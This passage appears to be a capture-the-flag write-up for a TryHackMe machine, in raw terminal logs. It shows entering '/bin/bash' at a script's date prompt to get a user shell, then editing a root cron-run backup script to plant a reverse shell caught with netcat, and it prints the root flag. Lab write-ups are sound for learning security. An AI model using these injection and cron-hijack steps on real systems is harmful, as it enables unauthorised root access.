drwxr-xr-x 6 gyles gyles   4.0K Jan 17  2021 .
drwxr-xr-x 5 root  root    4.0K Jan 15  2021 ..
-rwxr--r-- 1 gyles editors  399 Jan 15  2021 admin_checks
-rw------- 1 gyles gyles   5.6K Jan 17  2021 .bash_history
-rw-r--r-- 1 gyles gyles    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 gyles gyles   3.7K Apr  4  2018 .bashrc
drwx------ 2 gyles gyles   4.0K Jan 15  2021 .cache
drwx------ 3 gyles gyles   4.0K Jan 15  2021 .gnupg
drwxrwxr-x 3 gyles gyles   4.0K Jan 15  2021 .local
-rw-r--r-- 1 gyles gyles    807 Apr  4  2018 .profile
drwx------ 2 gyles gyles   4.0K Jan 15  2021 .ssh
-rw-r--r-- 1 gyles gyles      0 Jan 17  2021 .sudo_as_admin_successful
dale@TEAM:/home/gyles$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dale@TEAM:/home/gyles$ ls
admin_checks
dale@TEAM:/home/gyles$ ./admin_checks
-bash: ./admin_checks: Permission denied
dale@TEAM:/home/gyles$ sudo ./admin_checks
[sudo] password for dale: 
Sorry, try again.
[sudo] password for dale: 
sudo: 1 incorrect password attempt
dale@TEAM:/home/gyles$ sudo /home/gyles/admin_checks
[sudo] password for dale: 
Sorry, try again.
[sudo] password for dale: 
sudo: 1 incorrect password attempt
dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_check
[sudo] password for dale: 
dale@TEAM:/home/gyles$ whoami
dale
dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: test  
Enter 'date' to timestamp the file: 2022
The Date is Stats have been backed up
dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: test2
Enter 'date' to timestamp the file: /bin/bash
The Date is whoami
gyles
sudo -l
[sudo] password for gyles: 
[sudo] password for gyles: 
[sudo] password for gyles: 
id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
cd /
ls
bin   dev  home        initrd.img.old  lib64	   media  opt	root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib	       lost+found  mnt	  proc	run   snap  sys  usr  vmlinuz
cd root	
ls
bin   dev  home        initrd.img.old  lib64	   media  opt	root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib	       lost+found  mnt	  proc	run   snap  sys  usr  vmlinuz
cd root
ls
bin   dev  home        initrd.img.old  lib64	   media  opt	root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib	       lost+found  mnt	  proc	run   snap  sys  usr  vmlinuz
find / -name root.txt -type f 2>/dev/null

ls root
ls /root
ls
bin   dev  home        initrd.img.old  lib64	   media  opt	root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib	       lost+found  mnt	  proc	run   snap  sys  usr  vmlinuz
cd opt
ls
admin_stuff
cat admin_stuff
file admin_stuff
admin_stuff: directory
cd admin_stuff
ls
script.sh
cat script.sh
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
ls -hla
total 12K
drwxrwx--- 2 root admin 4.0K Jan 17  2021 .
drwxr-xr-x 3 root root  4.0K Jan 16  2021 ..
-rwxr--r-- 1 root root   200 Jan 17  2021 script.sh
ls -hla /usr/local/sbin/dev_backup.sh
-rwxr-xr-x 1 root root 64 Jan 17  2021 /usr/local/sbin/dev_backup.sh
ls -hla
total 12K
drwxrwx--- 2 root admin 4.0K Jan 17  2021 .
drwxr-xr-x 3 root root  4.0K Jan 16  2021 ..
-rwxr--r-- 1 root root   200 Jan 17  2021 script.sh
ls -hla /usr/local/bin/main_backup.sh
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh
cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
nano /usr/local/bin/main_backup.sh

nano /usr/local/bin/main_backup.sh

```

a bash reverse shell was setup

```sh
sami@bt:/opt/PayloadsAllTheThings$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.11.4.14] from (UNKNOWN) [10.10.50.142] 52724
bash: cannot set terminal process group (1392): Inappropriate ioctl for device
bash: no job control in this shell
root@TEAM:~# whoami
whoami
root
root@TEAM:~# find / -type f -name root.txt 2>/dev/null
find / -type f -name root.txt 2>/dev/null
/root/root.txt
root@TEAM:~# cat /root/root.txt
cat /root/root.txt
THM{fhqbznavfonq}
root@TEAM:~# 
```
![[Pasted image 20221102002606.png]]
